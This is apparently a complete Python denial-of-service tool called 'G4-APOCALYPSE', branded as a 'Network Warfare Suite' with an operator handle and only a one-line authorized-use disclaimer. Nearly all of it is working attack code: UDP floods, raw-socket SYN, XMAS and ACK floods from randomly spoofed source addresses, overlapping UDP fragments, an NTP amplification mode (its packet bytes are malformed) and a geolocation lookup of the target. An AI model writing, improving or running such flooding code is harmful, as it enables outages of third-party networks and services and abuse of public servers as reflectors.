
import sys
import socket
import threading
import random
import time
import os
import argparse
import struct
import json
import re # Added for center_colored_text helper
import requests

try:
    import psutil
except ImportError:
    print("[!] FATAL: 'psutil' library not found. Please run 'pip install psutil'.")
    sys.exit(1)

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] Warning: 'colorama' library not found. Colored output will be disabled.")
    # Dummy Fore and Style objects if colorama is not available
    class DummyColorama:
        def __getattr__(self, name):
            return ""
    Fore = DummyColorama()
    Style = DummyColorama()

# --- Global Control Flags ---
is_master_running = True
is_attack_paused_by_cpu = False

# --- Color Definitions for "Private & Noble" Theme ---
NOBLE_PURPLE = Fore.MAGENTA
BRIGHT_CYAN = Fore.CYAN
GOLD_YELLOW = Fore.YELLOW
WARNING_RED = Fore.RED
DARK_BORDER = Fore.LIGHTBLACK_EX if 'LIGHTBLACK_EX' in dir(Fore) else Fore.BLACK # Fallback for LIGHTBLACK_EX
INFO_GREEN = Fore.GREEN
NEUTRAL_WHITE = Fore.WHITE
RESET_ALL_STYLE = Style.RESET_ALL

# --- Helper for centering colored text ---
def center_colored_text(text_with_color, total_width):
    plain_text = re.sub(r'\x1b\[[0-9;]*m', '', text_with_color)
    padding = total_width - len(plain_text)
    left_padding = padding // 2
    right_padding = padding - left_padding
    return " " * left_padding + text_with_color + " " * right_padding

# --- ASCII ART and Banners ---
def display_main_banner():
    dragon_accent = f"{WARNING_RED}🔥{RESET_ALL_STYLE}" # Simple flame/dragon accent
    
    lines = [
        f"{DARK_BORDER}╔{'═' * 78}╗{RESET_ALL_STYLE}",
        center_colored_text(f"{dragon_accent} {NOBLE_PURPLE}G4-APOCALYPSE :: Multi-Vector Network Warfare Suite{RESET_ALL_STYLE} {dragon_accent}", 78),
        center_colored_text(f"{GOLD_YELLOW}Codename: SILENT STORM{RESET_ALL_STYLE}", 78),
        center_colored_text(f"{BRIGHT_CYAN}Operator: @atty525{RESET_ALL_STYLE}", 78),
        center_colored_text(f"{WARNING_RED}WARNING: FOR AUTHORIZED RESEARCH & TESTING ONLY. MISUSE IS PROHIBITED.{RESET_ALL_STYLE}", 78),
        f"{DARK_BORDER}╚{'═' * 78}╝{RESET_ALL_STYLE}",
    ]
    print("\n")
    for i, line_content in enumerate(lines):
        if i == 0 or i == len(lines) -1: # First and last lines are full borders
            print(line_content)
        else:
            print(f"{DARK_BORDER}║{RESET_ALL_STYLE}{line_content}{DARK_BORDER}║{RESET_ALL_STYLE}")
    print()

def display_recon_banner(target_ip):
    print("\n" + f"{DARK_BORDER}{'='*78}{RESET_ALL_STYLE}")
    print(center_colored_text(f"{NOBLE_PURPLE}[RECON]{RESET_ALL_STYLE} {BRIGHT_CYAN}Target System Analysis:{RESET_ALL_STYLE} {GOLD_YELLOW}{target_ip}{RESET_ALL_STYLE}", 78))
    try:
        response = requests.get(f"http://ip-api.com/json/{target_ip}?fields=status,message,country,city,lat,lon,isp,org,as,query", timeout=5)
        response.raise_for_status()
        data = response.json()
        if data.get('status') == 'success':
            print(f"\n{BRIGHT_CYAN}[+]{RESET_ALL_STYLE} Target Intelligence Report:")
            print(f"{DARK_BORDER}{'-' * 50}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}IP Address   :{RESET_ALL_STYLE} {NEUTRAL_WHITE}{data.get('query', 'N/A')}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}ISP          :{RESET_ALL_STYLE} {NEUTRAL_WHITE}{data.get('isp', 'N/A')}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}Organization :{RESET_ALL_STYLE} {NEUTRAL_WHITE}{data.get('org', 'N/A')}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}Location     :{RESET_ALL_STYLE} {NEUTRAL_WHITE}{data.get('city', 'N/A')}, {data.get('country', 'N/A')}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}Coordinates  :{RESET_ALL_STYLE} {NEUTRAL_WHITE}Lat: {data.get('lat', 'N/A')}, Lon: {data.get('lon', 'N/A')}{RESET_ALL_STYLE}")
            print(f"  {BRIGHT_CYAN}>{RESET_ALL_STYLE} {GOLD_YELLOW}ASN          :{RESET_ALL_STYLE} {NEUTRAL_WHITE}{data.get('as', 'N/A')}{RESET_ALL_STYLE}")
            print(f"{DARK_BORDER}{'-' * 50}{RESET_ALL_STYLE}")
    except requests.exceptions.RequestException:
        print(f"\n{WARNING_RED}[!]{RESET_ALL_STYLE} Warning: Target intelligence gathering failed. Proceeding with caution.")
    print(f"{DARK_BORDER}{'='*78}{RESET_ALL_STYLE}\n")

class StatisticsManager:
    def __init__(self):
        self.packet_counter, self.byte_counter = 0, 0
        self.peak_pps, self.peak_gbps = 0, 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def update(self, packets, size):
        with self.lock:
            self.packet_counter += packets
            self.byte_counter += size

    def display(self, duration, target_ip, port, method): # Added params for context
        global is_master_running, is_attack_paused_by_cpu
        last_display_time = time.time()
        initial_delay_passed = False

        # Header for the stats line
        header_text = f"{BRIGHT_CYAN}TARGET:{RESET_ALL_STYLE} {GOLD_YELLOW}{target_ip}:{port}{RESET_ALL_STYLE} {BRIGHT_CYAN}| METHOD:{RESET_ALL_STYLE} {GOLD_YELLOW}{method.upper()}{RESET_ALL_STYLE}"
        print(center_colored_text(header_text, 78))
        print(f"{DARK_BORDER}{'─' * 78}{RESET_ALL_STYLE}")

        while is_master_running:
            current_time = time.time()
            elapsed_time = current_time - self.start_time
            
            if elapsed_time > duration:
                break

            # Throttle display updates
            if current_time - last_display_time < 0.5 and initial_delay_passed : # Update more frequently
                time.sleep(0.05) 
                continue
            
            initial_delay_passed = True
            last_display_time = current_time

            with self.lock:
                pps = self.packet_counter / elapsed_time if elapsed_time > 0 else 0
                gbps = (self.byte_counter * 8) / elapsed_time / 1e9 if elapsed_time > 0 else 0
                self.peak_pps = max(self.peak_pps, pps)
                self.peak_gbps = max(self.peak_gbps, gbps)
            
            cpu_load = psutil.cpu_percent()
            status_indicator = f"{WARNING_RED}🔴 PAUSED (CPU){RESET_ALL_STYLE}" if is_attack_paused_by_cpu else f"{INFO_GREEN}🟢 RUNNING{RESET_ALL_STYLE}"
            
            progress_percentage = min(100.0, (elapsed_time / duration) * 100)
            progress_bar_len = 28 # Adjusted for new layout
            filled_len = int(progress_bar_len * progress_percentage / 100)
            bar_chars = "■" * filled_len + "□" * (progress_bar_len - filled_len)

            stats_line = (
                f"\r[{status_indicator}] [{bar_chars}] {NOBLE_PURPLE}{progress_percentage:6.2f}%{RESET_ALL_STYLE} "
                f"| {BRIGHT_CYAN}T:{RESET_ALL_STYLE} {GOLD_YELLOW}{elapsed_time:4.0f}/{duration}s{RESET_ALL_STYLE} "
                f"| {BRIGHT_CYAN}PPS:{RESET_ALL_STYLE} {GOLD_YELLOW}{pps:7,.0f}{RESET_ALL_STYLE} ({BRIGHT_CYAN}Peak:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.peak_pps:7,.0f}{RESET_ALL_STYLE}) "
                f"| {BRIGHT_CYAN}BW:{RESET_ALL_STYLE} {GOLD_YELLOW}{gbps:5.3f} Gbps{RESET_ALL_STYLE} ({BRIGHT_CYAN}Peak:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.peak_gbps:5.3f}{RESET_ALL_STYLE}) "
                f"| {BRIGHT_CYAN}CPU:{RESET_ALL_STYLE} {GOLD_YELLOW}{cpu_load:3.1f}%{RESET_ALL_STYLE} "
            )
            # Pad to full width or a fixed reasonable width
            try:
                terminal_width = os.get_terminal_size().columns -1
                sys.stdout.write(stats_line.ljust(terminal_width))
            except OSError: # Handle cases where terminal size can't be obtained (e.g. piping output)
                sys.stdout.write(stats_line + " " * (120 - len(stats_line))) # Fallback width
            sys.stdout.flush()
            
            if not is_master_running:
                break
            time.sleep(0.05) # Shorter sleep for faster UI updates if needed

        sys.stdout.write("\r" + " " * (os.get_terminal_size().columns -1 if 'os' in sys.modules else 120) + "\r")
        sys.stdout.flush()

    def generate_final_report(self):
        total_time = time.time() - self.start_time
        avg_pps = self.packet_counter / total_time if total_time > 0 else 0
        avg_gbps = (self.byte_counter * 8) / total_time / 1e9 if total_time > 0 else 0
        print("\n\n" + f"{DARK_BORDER}{'▓'*78}{RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}▓{RESET_ALL_STYLE}{center_colored_text(f'{NOBLE_PURPLE}G4-APOCALYPSE: MISSION DEBRIEF{RESET_ALL_STYLE}', 78)}{DARK_BORDER}▓{RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}{'▓'*78}{RESET_ALL_STYLE}")
        print(f"  {BRIGHT_CYAN}{'Mission Duration':<25}:{RESET_ALL_STYLE} {GOLD_YELLOW}{total_time:.2f} seconds{RESET_ALL_STYLE}")
        print(f"  {BRIGHT_CYAN}{'Total Packets Transmitted':<25}:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.packet_counter:,}{RESET_ALL_STYLE}")
        print(f"  {BRIGHT_CYAN}{'Total Data Transmitted':<25}:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.byte_counter / 1e9:.4f} GB ({self.byte_counter / 1e6:.2f} MB){RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}{'─'*78}{RESET_ALL_STYLE}")
        print(f"  {NOBLE_PURPLE}Performance Metrics:{RESET_ALL_STYLE}")
        print(f"    {BRIGHT_CYAN}{'Average Packets/sec (PPS)':<28}:{RESET_ALL_STYLE} {GOLD_YELLOW}{avg_pps:,.2f}{RESET_ALL_STYLE}")
        print(f"    {BRIGHT_CYAN}{'Average Bandwidth (Gbps)':<28}:{RESET_ALL_STYLE} {GOLD_YELLOW}{avg_gbps:.4f}{RESET_ALL_STYLE}")
        print(f"    {BRIGHT_CYAN}{'Peak Packets/sec (PPS)':<28}:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.peak_pps:,.2f}{RESET_ALL_STYLE}")
        print(f"    {BRIGHT_CYAN}{'Peak Bandwidth (Gbps)':<28}:{RESET_ALL_STYLE} {GOLD_YELLOW}{self.peak_gbps:.4f}{RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}{'▓'*78}{RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}▓{RESET_ALL_STYLE}{center_colored_text(f'{WARNING_RED}EXECUTION TERMINATED{RESET_ALL_STYLE}', 78)}{DARK_BORDER}▓{RESET_ALL_STYLE}")
        print(f"{DARK_BORDER}{'▓'*78}{RESET_ALL_STYLE}")

class SystemMonitor:
    def __init__(self, cpu_threshold):
        self.cpu_threshold = cpu_threshold
        self.full_power_mode = False # Sẽ được cập nhật từ Apocalypse class

    def monitor_cpu(self):
        global is_attack_paused_by_cpu, is_master_running
        while is_master_running:
            if not self.full_power_mode:  # Chỉ giám sát nếu không ở chế độ full power
                cpu_usage = psutil.cpu_percent(interval=1)
                if cpu_usage > self.cpu_threshold:
                    if not is_attack_paused_by_cpu:
                        sys.stdout.write(f"\n{WARNING_RED}[!]{RESET_ALL_STYLE} CPU OVERLOAD! Throttling engagement protocols... ")
                        sys.stdout.flush()
                        is_attack_paused_by_cpu = True
                elif is_attack_paused_by_cpu:
                    sys.stdout.write(f"\n{INFO_GREEN}[*]{RESET_ALL_STYLE} CPU levels nominal. Resuming full offensive capability... ")
                    sys.stdout.flush()
                    is_attack_paused_by_cpu = False
            # Luôn sleep để tránh vòng lặp quá nhanh, ngay cả khi ở full_power_mode (để vòng lặp chính không bị chiếm hết CPU)
            time.sleep(1) 

class PacketFactory:
    @staticmethod
    def checksum(msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff); s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def create_ip_header(src, dst, proto, length):
        return struct.pack('!BBHHHBBH4s4s', 0x45, 0, length, random.randint(1,65535), 0, 255, proto, 0, socket.inet_aton(src), socket.inet_aton(dst))

    @staticmethod
    def create_tcp_options(mss=None, wscale=None, sack_perm=False, tsval=None, tsecr=None):
        options = b''
        if mss is not None: # MSS Option (Kind 2, Length 4)
            options += struct.pack('!BBH', 2, 4, mss)
        if wscale is not None: # Window Scale Option (Kind 3, Length 3)
            options += struct.pack('!BBB', 3, 3, wscale)
        if sack_perm: # SACK Permitted Option (Kind 4, Length 2)
            options += struct.pack('!BB', 4, 2)
        if tsval is not None and tsecr is not None: # Timestamps Option (Kind 8, Length 10)
            options += struct.pack('!BBLL', 8, 10, tsval, tsecr)
        
        # Pad options to be a multiple of 4 bytes using NOPs (Kind 1)
        while len(options) % 4 != 0:
            options += b'\x01' 
        return options

    def create_tcp_packet(self, src, dst, port, flags_str, payload=b'', options=b''):
        tcp_header_base_len_bytes = 20
        tcp_options_len_bytes = len(options)
        tcp_header_total_len_bytes = tcp_header_base_len_bytes + tcp_options_len_bytes
        tcp_doff = tcp_header_total_len_bytes // 4 # Data Offset in 32-bit words

        flag_u = 1 << 5 if 'U' in flags_str.upper() else 0
        flag_a = 1 << 4 if 'A' in flags_str.upper() else 0
        flag_p = 1 << 3 if 'P' in flags_str.upper() else 0
        flag_r = 1 << 2 if 'R' in flags_str.upper() else 0
        flag_s = 1 << 1 if 'S' in flags_str.upper() else 0
        flag_f = 1 << 0 if 'F' in flags_str.upper() else 0
        tcp_flags_byte = flag_u + flag_a + flag_p + flag_r + flag_s + flag_f

        tcp_hdr = struct.pack('!HHLLBBHHH',
                              random.randint(1025, 65530),  # Source Port
                              port,                         # Destination Port
                              random.randint(1, 0xFFFFFFFF),# Sequence Number
                              random.randint(1, 0xFFFFFFFF) if flag_a else 0, # Ack Number
                              tcp_doff << 4,                # Data Offset field
                              tcp_flags_byte,               # Flags
                              random.randint(4096, 65535),  # Window Size
                              0,                            # Checksum (placeholder)
                              0)                            # Urgent Pointer
        
        pseudo_hdr = struct.pack('!4s4sBBH',
                                 socket.inet_aton(src), socket.inet_aton(dst),
                                 0, socket.IPPROTO_TCP, 
                                 tcp_header_total_len_bytes + len(payload))

        checksum_data = pseudo_hdr + tcp_hdr + options + payload
        chksum = self.checksum(checksum_data)
        tcp_hdr = tcp_hdr[:16] + struct.pack('H', chksum) + tcp_hdr[18:]
        
        total_packet_len = 20 + tcp_header_total_len_bytes + len(payload)
        ip_hdr = self.create_ip_header(src, dst, socket.IPPROTO_TCP, total_packet_len)
        return ip_hdr + tcp_hdr + options + payload

    @staticmethod
    def create_ntp_packet():
        # A standard NTPv4 client request packet
        return b'\\x23' + b'\\x00' * 47

class Apocalypse:
    def __init__(self, **kwargs):
        self.target_ip = kwargs['ip']
        self.port = kwargs['port']
        self.duration = kwargs['time']
        self.method = kwargs['method']
        self.threads = kwargs.get('threads', 250)
        self.ntp_servers = self._load_ntp_servers(kwargs.get('ntp_servers'))
        
        self.udp_payload_min, self.udp_payload_max = 512, 1472
        if kwargs.get('udp_payload_size'):
            parts = kwargs['udp_payload_size'].split(':')
            if len(parts) == 1 and parts[0].isdigit(): self.udp_payload_min = self.udp_payload_max = max(1, min(int(parts[0]), 65500))
            elif len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                self.udp_payload_min = max(1, min(int(parts[0]), 65500))
                self.udp_payload_max = max(self.udp_payload_min, min(int(parts[1]), 65500))
        self.tcp_custom_flags = kwargs.get('tcp_flags', "A") # Default ACK for RAMPAGE
        self.tcp_mss = kwargs.get('tcp_mss')
        self.factory = PacketFactory()
        self.stats = StatisticsManager()
        self.full_power_mode = kwargs.get('full_power', False)
        self.monitor = SystemMonitor(kwargs.get('cpu_threshold', 95.0))
        self.monitor.full_power_mode = self.full_power_mode # Truyền trạng thái full power cho monitor

    def _load_ntp_servers(self, file_path):
        if not file_path: return []
        try:
            with open(file_path, 'r') as f:
                servers = [line.strip() for line in f if line.strip()]
                print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} Loaded {GOLD_YELLOW}{len(servers)}{RESET_ALL_STYLE} NTP servers for amplification.")
                return servers
        except FileNotFoundError:
            print(f"{WARNING_RED}[!]{RESET_ALL_STYLE} Warning: NTP server file '{GOLD_YELLOW}{file_path}{RESET_ALL_STYLE}' not found. NTP-AMP will be ineffective.")
            return []

    def _require_root(self, method_name):
        if os.geteuid() != 0:
            print(f"\n[!] FATAL: Method '{method_name}' requires root privileges. Run with 'sudo'.")
            sys.exit(1)

    # --- Attack Method Implementations ---
    def _attack_udp_vortex(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    size = random.randint(self.udp_payload_min, self.udp_payload_max)
                    s.sendto(os.urandom(size), (self.target_ip, self.port))
                    self.stats.update(1, size)
                except (socket.error, OSError): pass

    def _attack_tcp_rampage(self):
        self._require_root("TCP-RAMPAGE")
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    tcp_options_data = self.factory.create_tcp_options(
                        mss=self.tcp_mss if self.tcp_mss else random.randint(1200,1460), 
                        tsval=random.randint(1,0xFFFFFFFF), tsecr=random.randint(1,0xFFFFFFFF))
                    spoofed_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
                    packet = self.factory.create_tcp_packet(spoofed_ip, self.target_ip, self.port, self.tcp_custom_flags, options=tcp_options_data)
                    s.sendto(packet, (self.target_ip, 0))
                    self.stats.update(1, len(packet))
                except (socket.error, OSError): pass
        s.close()

    def _attack_ntp_amp(self):
        if not self.ntp_servers: return
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = self.factory.create_ntp_packet()
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    s.sendto(packet, (random.choice(self.ntp_servers), 123))
                    self.stats.update(1, len(packet))
                except (socket.error, OSError): pass

    def _attack_tcp_xmas(self):
        self._require_root("TCP-XMAS")
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    spoofed_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
                    packet = self.factory.create_tcp_packet(spoofed_ip, self.target_ip, self.port, "FPU")
                    s.sendto(packet, (self.target_ip, 0))
                    self.stats.update(1, len(packet))
                except (socket.error, OSError): pass
        s.close()

    def _attack_syn_genesis(self):
        self._require_root("SYN-GENESIS")
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    spoofed_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
                    syn_options = self.factory.create_tcp_options(
                        mss=self.tcp_mss if self.tcp_mss else random.randint(1300,1460), 
                        wscale=random.randint(2,10), 
                        sack_perm=True,
                        tsval=random.randint(1,0xFFFFFFFF), 
                        tsecr=0) # tsecr is 0 in initial SYN
                    packet = self.factory.create_tcp_packet(spoofed_ip, self.target_ip, self.port, "S", options=syn_options)
                    s.sendto(packet, (self.target_ip, 0))
                    self.stats.update(1, len(packet))
                except (socket.error, OSError): pass
        s.close()

    def _attack_udp_frag(self):
        self._require_root("UDP-FRAG")
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        while is_master_running:
            if not is_attack_paused_by_cpu:
                try:
                    spoofed_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
                    payload = os.urandom(1024)
                    ip_header1 = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+8+512, random.randint(1,65535), 0x2000, 255, 17, 0, socket.inet_aton(spoofed_ip), socket.inet_aton(self.target_ip))
                    udp_header = struct.pack('!HHHH', random.randint(1024,65535), self.port, 8+len(payload), 0)
                    s.sendto(ip_header1 + udp_header + payload[:512], (self.target_ip, 0))
                    # Overlapping fragment
                    ip_header2 = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+len(payload)-256, random.randint(1,65535), 32, 255, 17, 0, socket.inet_aton(spoofed_ip), socket.inet_aton(self.target_ip))
                    s.sendto(ip_header2 + payload[256:], (self.target_ip, 0))
                    self.stats.update(2, len(payload) + 40)
                except (socket.error, OSError): pass
        s.close()
    
    def run(self):
        global is_master_running
        display_main_banner()
        display_recon_banner(self.target_ip)

        attack_map = {
            "UDP-VORTEX": [self._attack_udp_vortex],
            "TCP-RAMPAGE": [self._attack_tcp_rampage],
            "NTP-AMP": [self._attack_ntp_amp],
            "TCP-XMAS": [self._attack_tcp_xmas],
            "SYN-GENESIS": [self._attack_syn_genesis],
            "UDP-FRAG": [self._attack_udp_frag],
            "MULTI-VECTOR": [self._attack_syn_genesis, self._attack_udp_vortex, self._attack_tcp_xmas]
        }
        
        if self.method not in attack_map:
            print(f"{WARNING_RED}[!]{RESET_ALL_STYLE} FATAL: Unknown method '{GOLD_YELLOW}{self.method}{RESET_ALL_STYLE}'.")
            sys.exit(1)

        attack_functions = attack_map[self.method]
        print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} Target locked: {GOLD_YELLOW}{self.target_ip}:{self.port}{RESET_ALL_STYLE}")
        print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} Method selected: {GOLD_YELLOW}{self.method}{RESET_ALL_STYLE} | Total Duration: {GOLD_YELLOW}{self.duration}s{RESET_ALL_STYLE}")
        print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} Adaptive CPU Throttling enabled at {GOLD_YELLOW}{self.monitor.cpu_threshold}%{RESET_ALL_STYLE} threshold.")
        if self.full_power_mode:
            print(f"{WARNING_RED}[MODE]{RESET_ALL_STYLE} {GOLD_YELLOW}FULL POWER ENGAGED - RESOURCE LIMITS DISABLED!{RESET_ALL_STYLE}")
        print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} Deploying {GOLD_YELLOW}{self.threads}{RESET_ALL_STYLE} concurrent engagement units.")
        print(f"{NOBLE_PURPLE}[*]{RESET_ALL_STYLE} Apocalypse sequence initiated. Stand by...")
        time.sleep(3)

        all_threads = []
        if not self.full_power_mode: # Chỉ khởi động monitor nếu không ở full power mode
            monitor_thread = threading.Thread(target=self.monitor.monitor_cpu, daemon=True)
            monitor_thread.start()
        else:
            monitor_thread = None # Không có monitor thread

        stats_thread = threading.Thread(target=self.stats.display, args=(self.duration, self.target_ip, self.port, self.method), daemon=True)
        stats_thread.start()

        for attack_func in attack_functions:
            for _ in range(self.threads // len(attack_functions)):
                t = threading.Thread(target=attack_func, daemon=True)
                all_threads.append(t)
                t.start()

        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print(f"\n\n{WARNING_RED}[!]{RESET_ALL_STYLE} EMERGENCY HALT: User aborted the mission.")
        finally:
            is_master_running = False
            print(f"\n{INFO_GREEN}[*]{RESET_ALL_STYLE} Ceasefire order issued. Halting all attack vectors...")
            for t in all_threads: t.join(timeout=0.1)
            if monitor_thread: # Chỉ join nếu monitor_thread tồn tại
                monitor_thread.join(timeout=0.1)
            stats_thread.join(timeout=0.1)
            self.stats.generate_final_report()

def main():
    parser = argparse.ArgumentParser(description="G4-APOCALYPSE Network Warfare Suite", formatter_class=argparse.RawTextHelpFormatter, add_help=False)
    req = parser.add_argument_group('Required Arguments')
    req.add_argument("ip", help="Target IP address.")
    req.add_argument("port", type=int, help="Target port.")
    req.add_argument("time", type=int, help="Attack duration in seconds.")
    req.add_argument("method", choices=["UDP-VORTEX", "TCP-RAMPAGE", "NTP-AMP", "TCP-XMAS", "SYN-GENESIS", "UDP-FRAG", "MULTI-VECTOR"], help="The attack method to use.")

    opt = parser.add_argument_group('Optional Arguments')
    opt.add_argument("--threads", type=int, default=250, help="Number of concurrent attack threads (default: 250).")
    opt.add_argument("--ntp_servers", default="ntp_servers.txt", help="File with a list of NTP servers for NTP-AMP (default: ntp_servers.txt).")
    opt.add_argument("--udp-payload-size", help="UDP payload size. Format: MIN:MAX or FIXED (e.g., 1024:1472 or 1200).")
    opt.add_argument("--tcp-flags", help="TCP flags for TCP-RAMPAGE (e.g., 'SA' for SYN+ACK, 'FPA' for FIN+PSH+ACK). Default: 'A'.")
    opt.add_argument("--tcp-mss", type=int, help="Specify MSS for TCP SYN-GENESIS and TCP-RAMPAGE options.")
    opt.add_argument("--cpu_threshold", type=float, default=95.0, help="CPU usage percentage to trigger auto-pause (default: 95.0).")
    opt.add_argument("--full", type=lambda x: (str(x).lower() == 'true'), default=False, help="Enable full power mode (true/false), disables CPU/RAM limits (default: false).")
    opt.add_argument('-h', '--help', action='help', default=argparse.SUPPRESS, help='Show this help message and exit.')

    if len(sys.argv) == 1:
        display_main_banner()
        parser.print_help()
        sys.exit(0)

    args = vars(parser.parse_args())

    try:
        socket.inet_aton(args['ip'])
    except socket.error:
        print(f"{WARNING_RED}[!]{RESET_ALL_STYLE} Invalid IP: '{GOLD_YELLOW}{args['ip']}{RESET_ALL_STYLE}' is not a valid IPv4 address.")
        sys.exit(1)
    
    apocalypse = Apocalypse(**args)
    try:
        apocalypse.run()
    except KeyboardInterrupt:
        global is_master_running
        is_master_running = False
        print(f"\n\n{WARNING_RED}[!]{RESET_ALL_STYLE} EMERGENCY HALT: User aborted the mission.")
        print(f"{INFO_GREEN}[*]{RESET_ALL_STYLE} All systems shutting down immediately.")
        sys.exit(0)

if __name__ == "__main__":
    main()
